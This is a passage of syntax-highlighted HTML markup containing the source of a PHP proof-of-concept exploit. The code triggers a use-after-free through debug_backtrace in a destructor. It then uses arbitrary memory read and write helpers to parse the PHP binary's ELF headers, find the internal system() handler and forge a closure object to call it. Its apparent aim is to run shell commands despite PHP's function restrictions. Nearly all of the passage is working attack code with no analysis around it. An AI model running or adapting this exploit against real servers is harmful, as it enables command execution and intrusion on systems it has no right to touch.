class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 